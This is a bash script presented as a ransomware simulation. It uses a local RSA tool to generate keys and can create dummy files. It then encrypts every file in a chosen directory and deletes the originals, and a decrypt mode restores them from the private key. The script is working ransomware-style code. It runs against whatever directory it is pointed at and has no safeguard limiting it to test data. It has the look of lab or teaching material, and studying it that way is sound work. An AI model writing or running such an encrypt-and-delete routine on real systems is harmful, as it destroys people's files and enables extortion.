#!/bin/bash

# ==============================================================================
# Ransomware Simulation Script (RSA Implementation)
# Supports: Generation, Encryption and Decryption
# ==============================================================================
# Usage:
#   Attack:  ./ransomware.sh <target_directory> [num_files]
#   Restore: ./ransomware.sh -d <target_directory>
# ==============================================================================

MODE="ENCRYPT"
TARGET_DIR=""
FILE_COUNT=""
RSA_TOOL="./rsa"
KEY_SIZE=1024
PUB_KEY="public_${KEY_SIZE}.key"
PRIV_KEY="private_${KEY_SIZE}.key"

# check if the first argument is "-d" for decryption
if [ "$1" == "-d" ]; then
    MODE="DECRYPT"
    TARGET_DIR="$2"
else
    TARGET_DIR="$1"
    FILE_COUNT="$2"
fi

# validation
if [ -z "$TARGET_DIR" ]; then
    echo "Usage: $0 [-d] <target_directory> [num_files_to_create]"
    exit 1
fi

if [ ! -d "$TARGET_DIR" ]; then
    echo "Error: Directory $TARGET_DIR does not exist."
    exit 1
fi

if [ ! -f "$RSA_TOOL" ]; then
    echo "Error: $RSA_TOOL not found"
    exit 1
fi

# ==============================================================================
# ENCRYPTION MODE
# ==============================================================================
if [ "$MODE" == "ENCRYPT" ]; then

    # Key Generation
    if [ ! -f "$PUB_KEY" ]; then
        echo "!> Generating RSA-${KEY_SIZE} key pair..."
        $RSA_TOOL -g $KEY_SIZE
    else
        echo "!> Using existing public key: $PUB_KEY"
    fi

    # File Generation (Optional)

    for ((i=1; i<=FILE_COUNT; i++)); do
        
        yes "This file WAS encrypted" | head -c 100K > "${TARGET_DIR}/file_${i}.txt"
        echo "Generated 100KB file: file_${i}.txt"
    done


    echo "[> Starting Encryption..."
    for file in "$TARGET_DIR"/*; do
        # skip directories, already encrypted files, script itself, and keys
        if [ -d "$file" ] || [[ "$file" == *.enc ]] || [[ "$file" == "$0" ]]; then continue; fi
        if [[ "$file" == *"$PUB_KEY"* ]] || [[ "$file" == *"$PRIV_KEY"* ]]; then continue; fi

        echo "  Encrypting: $file"
        
        # RSA Encrypt: ./rsa -e -i input -o input.enc -k pubkey
        $RSA_TOOL -i "$file" -o "${file}.enc" -k "$PUB_KEY" -e

        # Verify and Delete Original
        if [ $? -eq 0 ] && [ -f "${file}.enc" ]; then
            rm "$file"
        else
            echo "  !< Failed to encrypt $file"
        fi
    done
    echo "!> Files encrypted."

# ==============================================================================
# DECRYPTION MODE
# ==============================================================================
elif [ "$MODE" == "DECRYPT" ]; then

    if [ ! -f "$PRIV_KEY" ]; then
        echo "Error: Private key $PRIV_KEY not found! Decryption impossible."
        exit 1
    fi

    echo "!> Starting Decryption ..."
    for file in "$TARGET_DIR"/*.enc; do
        # check found no files
        if [ ! -f "$file" ]; then continue; fi

        echo "  Decrypting: $file"

        # remove .enc extension
        ORIGINAL_FILE="${file%.enc}"

        # RSA Decrypt: ./rsa -d -i input.enc -o output -k privkey
        $RSA_TOOL -i "$file" -o "$ORIGINAL_FILE" -k "$PRIV_KEY" -d

        if [ $? -eq 0 ] && [ -f "$ORIGINAL_FILE" ]; then
            # remove the encrypted file after success
            rm "$file" 
            echo "  !> Restored: $ORIGINAL_FILE"
        else
            echo "  !< Failed to decrypt $file"
        fi
    done
    echo "!> Decryption complete."
fi